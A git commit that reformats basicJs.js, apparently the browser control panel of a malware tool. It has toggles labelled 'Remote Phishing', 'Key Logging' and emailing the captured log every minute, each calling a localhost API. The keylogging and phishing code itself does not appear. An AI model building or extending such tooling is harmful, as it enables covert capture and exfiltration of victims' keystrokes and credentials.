8ac445085591275604a5f69ffd268d54d0de73b1
Harsha Vardhan <harsha6084@gmail.com>
2022-05-01 10:41:43 +0530

    Basic updates

--- basicJs.js
+++ basicJs.js
@@ -3,38 +3,38 @@ var keyLoggingVar = false;
 var emailVar = false;
 let request = new XMLHttpRequest();
 
-function exploit(){
-	if(exploitVar){
+function exploit() {
+	if (exploitVar) {
 		document.getElementById("exploit").innerHTML = "Start Remote Phishing!";
 	}
-	else{
+	else {
 		document.getElementById("exploit").innerHTML = "Stop Remote Phishing!";
 	}
-	exploitVar= !exploitVar;
+	exploitVar = !exploitVar;
 	request.open("GET", "http://localhost:8080/api/v1/setExploit");
 	request.send();
 }
 
-function keyLogging(){
-	if(keyLoggingVar){
+function keyLogging() {
+	if (keyLoggingVar) {
 		document.getElementById("keyLogging").innerHTML = "Start Key Logging!";
 	}
-	else{
+	else {
 		document.getElementById("keyLogging").innerHTML = "Stop Key Logging!";
 	}
-	keyLoggingVar= !keyLoggingVar;
+	keyLoggingVar = !keyLoggingVar;
 	request.open("GET", "http://localhost:8080/api/v1/setKeyLogging");
 	request.send();
 }
 
-function email(){
-	if(emailVar){
+function email() {
+	if (emailVar) {
 		document.getElementById("email").innerHTML = "Send a email of log every minute";
 	}
-	else{
+	else {
 		document.getElementById("email").innerHTML = "Stop email";
 	}
-	emailVar= !emailVar;
+	emailVar = !emailVar;
 	request.open("GET", "http://localhost:8080/api/v1/setEmail");
 	request.send();
 }
